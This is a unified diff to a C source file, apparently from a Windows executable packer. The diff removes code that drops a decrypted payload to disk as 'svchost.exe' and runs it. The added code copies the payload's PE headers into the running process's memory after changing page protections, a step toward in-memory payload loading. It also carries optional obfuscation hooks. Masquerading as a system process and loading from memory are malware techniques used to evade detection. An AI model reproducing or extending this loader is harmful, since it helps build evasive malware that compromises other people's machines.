@@ -7,8 +7,7 @@
 #include "../obfuscation/obfuscate.h"
 #endif
 
-__attribute__((section("packyou")))
-int unpack()
+__attribute__((section("packyou"))) int unpack()
 {
 	SIZE_T size = (SIZE_T)FILE_SIZE;
 	BYTE *base;
@@ -25,19 +24,21 @@ int unpack()
 	memcpy(base, payload, size);
 #endif
 
-	HANDLE file =
-		CreateFile("svchost.exe", GENERIC_WRITE | GENERIC_READ, 0, NULL,
-			   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *)base;
+	/* dos_header->e_lfanew is is the offset of the next header */
+	IMAGE_NT_HEADERS *nt_header =
+		(IMAGE_NT_HEADERS *)(((BYTE *)dos_header) +
+				     dos_header->e_lfanew);
 
-	if (file == INVALID_HANDLE_VALUE)
+	HMODULE curr_proc_base = GetModuleHandle(NULL);
+	if (curr_proc_base == NULL)
 		return GetLastError();
 
-	DWORD written = 0;
-	BOOL write_ok = WriteFile(file, base, size, &written, NULL);
-	CloseHandle(file);
-
-	if (!write_ok)
-		return GetLastError();
+	/* Write payload header to the memory of current process */
+	DWORD old_protect;
+	VirtualProtect(curr_proc_base, nt_header->OptionalHeader.SizeOfHeaders,
+		       PAGE_READWRITE, &old_protect);
+	memcpy(curr_proc_base, base, nt_header->OptionalHeader.SizeOfHeaders);
 
 #ifdef OBFUSCATE
 	if (!clean(base))
@@ -47,25 +48,10 @@ int unpack()
 		return GetLastError();
 #endif
 
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	ZeroMemory(&pi, sizeof(pi));
-
-	if (CreateProcess("svchost.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL,
-			  &si, &pi) == 0)
-		return GetLastError();
-
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
-
 	return ERROR_SUCCESS;
 }
 
-__attribute__((section("packyou")))
-int main()
+__attribute__((section("packyou"))) int main()
 {
 	int ret = unpack();
 
